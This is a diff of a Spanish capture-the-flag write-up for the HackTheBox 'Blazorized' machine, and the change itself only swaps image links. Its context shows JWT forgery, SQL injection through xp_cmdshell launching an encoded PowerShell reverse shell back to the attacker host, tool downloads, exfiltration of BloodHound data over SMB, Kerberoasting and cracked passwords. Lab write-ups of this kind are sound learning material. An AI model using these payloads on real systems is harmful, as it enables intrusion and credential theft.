@@ -14,7 +14,7 @@ lo primero como siempre el escaneo de nmap:
 nmap -p- --open --min-rate 500 -sT -vvv -n -Pn 10.10.11.22 -oG allports
 ```
 
-![[Pasted image 20241112122841.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112122841.png)
 
 ```bash
 nmap -sVC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49672,49674,49675,49678,49683,49705,49763,49776 10.10.11.22 -oN ports
@@ -124,10 +124,10 @@ hay mojollon de puertos abiertos por lo que se ve de lejos que es un active dire
 si vemos mejor el puerto 80 vemos un dominio 
 por lo que vamos a añadirlo al etc/hosts
 
-![[Pasted image 20241112123752.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112123752.png)
 ejecutamos un whatweb al dominio para ver un poco lo que hay
 
-![[Pasted image 20241112123859.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112123859.png)
 
 no vemos nada interesante asique bueno 
 
@@ -136,57 +136,57 @@ http://blazorized.htb/
 
 al entrar vemos lo siguiente 
 
-![[Pasted image 20241112124021.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124021.png)
 
 si nos ponemos a mirar la web pone en todos lados que hay fallos por una api no encontrada.
 
 lo unico que ve o que tiene algo es el apartado de updates
 
-![[Pasted image 20241112124555.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124555.png)
 si le damos a chek for updates nos sale un error 
 parece que todo tiene que ver con una api
 
 vamos a ver a donde hace las solicitudes al hacer click a chek for updates
 
-![[Pasted image 20241112124820.png]]
-![[Pasted image 20241112124838.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124820.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112124838.png)
 
 vemos un nuevo dominio 
 por lo que vamos a añadirlo al etc/hosts
 
-![[Pasted image 20241112125022.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112125022.png)
 
 provamos a hacer un ping a ver si ya estas
 
-![[Pasted image 20241112125130.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112125130.png)
 vemos que si por lo que voy a probar a darle otra vez al boton de updates
-![[Pasted image 20241112181824.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112181824.png)
 ya que emos encontrado el subdominio api me da curiosidad si hay mas por lo que vamos a tirar de gobuster para ver si hay mas
 
 ```bash
 gobuster vhost -u http://blazorized.htb -w /usr/share/seclists/Discovery/DNS/* --append-domain -t 200
 ```
 
-![[Pasted image 20241112183014.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112183014.png)
 encontramos un subdominio admin por lo que lo añadimos al etc/hosts
 
 vamos tambie a enmuerar usuarios ya de paso con netexec:
 ```bash
 netexec smb blazorized.htb
 ```
-![[Pasted image 20241112184353.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112184353.png)
 vemos un DC1 por lo que lo añadimos tambien al etc/hosts
 
 si vamos al http://admin.blazorized.htb veremos lo siguiente:
-![[Pasted image 20241112184943.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112184943.png)
 vale un panel de login
 
 vamos a salirnos de aqui un rato y vamos a volver a http://blazorized.htb/check-updates
 vamos a interceptar con burpsuite la peticion de cuando le damos a hacer la update
-![[Pasted image 20241112185632.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112185632.png)
 si le damos a forward 4 veces veremos el proceso de peticiones.
 nos pasamos al repiter las 2 y la 4
-![[Pasted image 20241112190052.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112190052.png)
 si le damos a send a la 2 pues nos sale todos los datos de los post que nos añade al hacer la actualizacion 
 y la 4 las tablas 
 
@@ -198,47 +198,47 @@ primero vamos a hacerlo con el de la 4 y vamos a usar primero flask-unsign
 flask-unsign -d -c 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzMxNDM0NDM2LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.eObsCLBQCB67MVZ_2IkB2wJZphC7uWLRsS7hn7G0VmMowOy46Z6pEwi-svyNaHVT1oHzyzJA1eJbzGAuphFn5w'
 ```
 
-![[Pasted image 20241112191108.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112191108.png)
 vemos que nos da el algoridmo y poco mas
 pero si desciframos en base64 el paiload del token vemos algo mas util
 
 ```bash
  echo 'eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzMxNDM0NDM2LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9' | base64 -d | jq
 ```
-![[Pasted image 20241112191332.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241112191332.png)
 tenemos un correo
 si con burpsuite nos ponemos a ver el historial de consultas desde la raiz del dominio base vemos muchas consulatas a archivos .dll
-![[Pasted image 20241113181645.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113181645.png)
 si pillamos uno ( yo e pillado el que se llama helper) y lo pasamos por un programa llamado AvaloniaILSpy
 
-![[Pasted image 20241113183221.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113183221.png)
 si nos metemos en el apartado JWT (jason web token) vemso algo muy critico
-![[Pasted image 20241113183326.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113183326.png)
 por lo que podemos crear nustro propio jwt
 vamos a hacerlo con el interprete de python3
 
-![[Pasted image 20241113184752.png]]
-![[Pasted image 20241113184909.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113184752.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113184909.png)
 perfecto tenemos jwt
 por lo que si nos vamos al panel de logueo y en el inspector de tareas en la parte de almacenamiento local lo pegamos
 
-![[Pasted image 20241113185336.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113185336.png)
 y recargamos la pagina
-![[Pasted image 20241113185442.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113185442.png)
 acceso
 tonteando un rato por aqui e descubierto una posible SQLI en el panel de chekear duplicados:
 
-![[Pasted image 20241113190448.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113190448.png)
 no esta dando un resultado exitoso (asta donde se en los post no hay referencias a Neo genesis evangelion asique xdd) por lo que esta haciendo la injecion
 
 por lo que vamos a intentar mandarnos la tipica revershell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
 
-![[Pasted image 20241113191252.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113191252.png)
 una vez echo lo ponemos utf-16le y en base64:
 ```bash
 cat rev.ps1 | iconv -t utf-16le | base64 -w 0; echo
 ```
-![[Pasted image 20241113191831.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113191831.png)
 y vamos a usar la siguiente injecion para acceder:
 ```bash
 eva013'; EXEC xp_cmdshell 'powershell -e CgAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADYALgA4ADkAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAAoACgA=' -- -
@@ -249,11 +249,11 @@ nos ponemos en escucha por el puerto 4444
 rlwrap -cAr nc -nlvp 4444
 ```
 
-![[Pasted image 20241113192344.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113192344.png)
 y bump estamos dentro
 
 si nos vamos a la carpeta de Users vemos mas usuarios
-![[Pasted image 20241113192709.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113192709.png)
 vamos a intentar hacer el reconocimiento mediante sharphound.exe y blodhount
 
 vamos a usar un server python3 y wget pra esto:
@@ -262,13 +262,13 @@ vamos a usar un server python3 y wget pra esto:
  wget "http://10.10.16.89:8000/SharpHound.exe" -OutFile .\SharpHound.exe
 ```
 
-![[Pasted image 20241113194702.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113194702.png)
 
 y lo ejecutamos de esta manera:
 ```cmd
 .\SharpHound.exe -c ALL
 ```
-![[Pasted image 20241113194918.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113194918.png)
 nos crea un .zip que tenemos que pasarnos
 
 para pasarnoslo vamos a usar impacket y smb de esta forma en la maquina atacante:
@@ -277,7 +277,7 @@ para pasarnoslo vamos a usar impacket y smb de esta forma en la maquina atacante
 impacket-smbserver pepe $(pwd) -username zzero -password zzero -smb2support
 ```
 
-![[Pasted image 20241113195451.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113195451.png)
 y para pasarlo seria
 
 ```cmd
@@ -287,15 +287,15 @@ copy 20241113124846_BloodHound.zip \\10.10.16.89\smbfolder\blod.zip
 
 una vez copiado lo pasamos al blodhunt
 
-![[Pasted image 20241113200203.png]]
-![[Pasted image 20241113201322.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113200203.png)
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113201322.png)
 (e tenido que ir a la version de docker por unos fallos)
 sui le damos a outbound object control vemos que tenemos control de un usuario
 
-![[Pasted image 20241113201722.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113201722.png)
 
 y si vemos la info de el abuso 
-![[Pasted image 20241113201631.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113201631.png)
 nos dice que podemos usar keberos para un tiket 
 para ello vamos a usar powerview como bien dice el bloodhound
 
@@ -312,16 +312,16 @@ Set-DomainObject -Identity rsa_4810 -SET @{serviceprincipalname='none xistent/BL
 Get-DomainUser rsa_4810 | Get-DomainSPNTicket
 ```
 y nos va a solatar esto
-![[Pasted image 20241113203541.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113203541.png)
 que lo podemos crakear 
 y nos da esta contraseña
 
-![[Pasted image 20241113203619.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113203619.png)
 lo probamos con netexect para ver si esta bien:
 ```bash
 netexec smb blazorized.htb -u 'RSA_4810' -p '(Ni7856009854Ki05Ng0005 #)'
 ```
-![[Pasted image 20241113205400.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113205400.png)
 (NOTA: sale que esta mal pero esta bien. estuve en los foros de la maquina mirando y no soy al unico que le pasa)
 
 y ahora con evil-winrm nos conectamos:
@@ -329,15 +329,15 @@ y ahora con evil-winrm nos conectamos:
 evil-winrm -i blazorized.htb -u 'rsa_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
 ```
 
-![[Pasted image 20241113205522.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113205522.png)
 ahora vamos al directorio C:\Windows\sysvol\sysvol\blazorized.htb\scripts
-![[Pasted image 20241113205936.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113205936.png)
 y investigando un poco en el directorio A32FF3AEAA23 vemos un .bat
-![[Pasted image 20241113210024.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113210024.png)
 
 hay un suario SSA_6010 que se esta conectando a este directorio casi constantemente
 
-![[Pasted image 20241113210224.png]]
+![](https://404zzero.github.io/zzero.github.io//assets/images/Blazorized/Pasted-image-20241113210224.png)
 por lo que podemos intentar hacer una revershell para haceder al suario mediante que modifiquemos sus atrivutos en el entorno AD
 
 ```bash
